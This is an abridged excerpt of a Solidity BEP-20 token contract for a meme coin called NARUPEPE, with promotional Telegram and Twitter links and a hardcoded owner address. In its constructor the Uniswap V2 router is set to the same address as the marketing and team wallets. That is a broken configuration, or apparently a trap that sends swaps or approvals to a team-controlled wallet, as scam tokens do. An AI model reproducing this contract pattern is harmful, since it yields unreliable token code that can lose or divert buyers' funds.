...
/**
   Telegram: https://t.me/Narupepe
   Twitter : https://twitter.com/NARUPEPEBSC
*/
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x86f5dC7f05c3cEd37E815Acc948a713534FfA8Ec; // owner address
...
contract NARUPEPE is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "NARUPEPE";
    string private _symbol = "NARUPEPE";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xbcd10884d410c6377322585b12CBEeEF534b0839); // Marketing Address
    address payable private teamWalletAddress = payable(0xbcd10884d410c6377322585b12CBEeEF534b0839); // Team Address
    ...
    constructor () {
        ...
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xbcd10884d410c6377322585b12CBEeEF534b0839); 
